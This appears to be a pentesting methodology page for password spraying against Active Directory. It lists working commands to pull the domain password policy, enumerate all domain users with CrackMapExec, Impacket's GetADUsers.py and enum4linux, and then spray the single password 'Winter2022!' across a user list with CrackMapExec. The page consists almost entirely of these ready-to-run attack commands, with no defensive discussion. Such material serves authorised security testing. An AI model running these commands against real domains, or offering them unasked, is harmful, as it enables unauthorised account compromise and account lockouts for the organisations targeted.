---
description: Methodology for performing password spraying attacks against active directory
---

# Spraying Active Directory

### Obtain Password Policy

```bash
# Get Password Policy with CrackMapExec
crackmapexec smb $dc -u $username -p $password --pass-pol

# Get Password Policy with Net Accounts
net accounts
```

### Get List of Users

```bash
# Get List of Users with CrackMapExec
crackmapexec smb $dc -u $username -p $password --users

# Get List of Users with Impacket
GetADUsers.py $domain/$username:$password -all -dc-ip $dc

# Get List of Users with Enum4linux
enum4linux $dc -u $username -p $password -U
```

### Spraying

```bash
# Spray with CrackMapExec
crackmapexec smb $ip -u $username_list -p Winter2022! --continue-on-success
```
